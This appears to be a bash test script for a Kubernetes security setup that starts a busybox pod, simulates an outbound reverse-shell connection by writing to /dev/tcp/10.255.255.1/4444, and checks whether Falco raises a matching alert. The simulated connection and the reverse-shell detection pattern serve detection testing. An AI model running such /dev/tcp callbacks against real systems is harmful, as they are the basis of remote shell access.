#!/usr/bin/env bash
set -euo pipefail

ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/../.." && pwd)"
# shellcheck source=scripts/scenario-lib.sh
source "${ROOT}/scripts/scenario-lib.sh"

SCENARIO_ID="04"
POD="scenario-04-shell"

scenario_cleanup "$SCENARIO_ID"
scenario_ensure_pod "$SCENARIO_ID" "$POD" busybox:1.36 --command -- sleep 3600 >/dev/null

echo ">>> Simulate reverse shell outbound from ${POD} (scenario ${SCENARIO_ID})..."
kubectl exec -n "$SCENARIO_NS" "$POD" -- sh -c 'sh -c "echo test >/dev/tcp/10.255.255.1/4444"' 2>/dev/null || true

echo ">>> Waiting for Falco..."
sleep 8
"${ROOT}/scripts/capture-scenario-evidence.sh" 3m 'K8sSoar Reverse Shell Outbound|Reverse shell|scenario-04'

scenario_cleanup "$SCENARIO_ID"
